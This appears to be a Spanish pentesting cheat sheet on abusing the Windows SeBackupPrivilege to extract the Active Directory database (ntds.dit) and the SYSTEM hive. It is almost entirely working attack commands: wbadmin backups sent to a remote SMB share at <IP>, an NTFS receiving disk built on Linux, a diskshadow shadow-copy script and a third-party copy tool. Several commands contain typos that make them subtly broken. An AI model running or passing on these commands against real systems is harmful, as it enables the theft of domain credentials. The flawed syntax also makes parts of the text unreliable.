# SeBackupPrivilege

Permite a un usuario con permisos de backup, obtener información que únicamente es accesible por el administrador.  Puede acceder a todo el disco, excepto los archivos que tengan permisos explícitos.



```csharp
wbadmin start backup -backuptarget:\\<IP>\Folder -include:c:\windows\ntds
echo y | wbadmin start backup -backuptarget:\\<IP>\Folder -include:c:\windows\ntds
wbadmin get versions # Obtiene las versiones de los BK
echo y | wbadmin start recovery -version <Version> -itemtype:file items:c:\windows\ntds\ntds.dit -recorverytarget:<rutalocal> -norestoreacl

```

{% hint style="danger" %}
a backup cannot be done  to a remote shared folder which is not a hosted on a volume formatted with NTFS/ReFS.
{% endhint %}

#### Crear carpeta NTFS en Linux

```bash
dd if=/dev/zero of=ntfs.disk bs=1024M count=2 #2GB
losetup -fP ntfs.disk
losetup -a # ver donde queda montada
mkfs.ntfs /dev/loopX
mount /dev/loopX </mnt>
```

## diskshadow

Se crea un archivo con la siguiente estructura

```bash
set metadata c:\temp\metda.cab#
set context persistent#
add volume c: aliad tmpwindrive#
create#
expose %tmpwindrive% z:#
```

Se carga al servidor, y se ejecuta

```csharp
diskshadow.exe /s <archivo.txt>
```

Debido a los permisos exclusivos que tienen los archivos ntds.dit y SYSTEM, se deben copiar sin dichos permisos, usando la herramienta

{% embed url="https://github.com/giuliano108/SeBackupPrivilege," %}

```csharp
Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit c:\temp\ntds.dit -overwrite
Copy-FileSeBackupPrivilege z:\windows\system32\config\SYSTEM c:\temp\SYSTEM -overwrite
```
